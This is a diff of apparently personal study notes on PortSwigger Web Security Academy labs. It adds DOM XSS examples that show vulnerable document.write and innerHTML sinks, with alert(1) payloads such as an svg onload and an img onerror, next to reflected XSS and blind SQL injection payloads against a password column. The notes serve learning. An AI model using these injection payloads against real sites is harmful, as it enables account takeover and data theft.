@@ -50,15 +50,40 @@ TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='a
 - url ``` web-security-academy.net/?search=<script>alert%281%29<%2Fscript> ```
 - ``` <script> alert(1) </script>```
 
-#### dom based
-- search "asdf"
-- as the input writes out to the html page, by using document.write function by site.
+#### DOM XSS
+- "View source" option won't work for DOM XSS testing 
+
+
+document.write
+```js
+function trackSearch(query) {
+	document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
+}
+var query = (new URLSearchParams(window.location.search)).get('search');
+if(query) {
+	trackSearch(query);
+}
 ```
-<img src="/resources/images/tracker.gif?searchTerms=asdf">
-```
-- change the input as 
+- ``` "><svg onload=alert(1)> ```
+
+
+innerHTML
+```javascript
+function doSearchQuery(query) {
+    document.getElementById('searchMessage').innerHTML = query;
+}
+var query = (new URLSearchParams(window.location.search)).get('search');
+if(query) {
+    doSearchQuery(query);
+}
 
 ```
-<img src="/resources/images/tracker.gif?searchTerms=asdf" <svg="" onload="alert(1)">
+- ``` <img src=1 onerror=alert(1)> ```
+
+
+href attribute
+```javascript
+
 ```
+- ```  ```
 
